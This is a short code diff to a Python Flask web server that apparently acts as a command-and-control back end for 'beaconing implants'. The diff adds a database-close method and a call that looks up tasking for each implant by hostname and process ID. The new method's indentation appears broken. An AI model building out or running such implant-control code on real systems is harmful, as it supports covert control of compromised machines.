@@ -10,6 +10,7 @@ from flask import make_response
 from gevent import wsgi
 from core.config import *
 from core.message import Message
+from core.tasking import Tasking
 
 
 class WebServer(object):
@@ -27,7 +28,7 @@ class WebServer(object):
         with open(self.profile) as file:
             self.json = json.load(file)
 
-        # tries to open a database connection
+        # tries to open the database connection
         try:
             self.connection = pymysql.connect(host="localhost",
                                               port=3306,
@@ -36,8 +37,34 @@ class WebServer(object):
                                               db=database,
                                               autocommit=True)
 
+        # exception raised during database connection
         except Exception:
             raise
+
+     def close_database_connection(self):
+        """
+        DESCRIPTION:
+            This function closes the database connection
+
+        RETURNS:
+            None
+        """
+        if self.connection.open:
+            self.connection.close()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
     def start_web_server(self):
         """
@@ -156,5 +183,7 @@ class WebServer(object):
                         operating_system = j["operating_system"]
 
                         # TO DO: check for tasking for the beaconing implant
+                        t = Tasking()
+                        print(t.check_tasking(hostname, process_id))
 
             return "rc4 beacon"
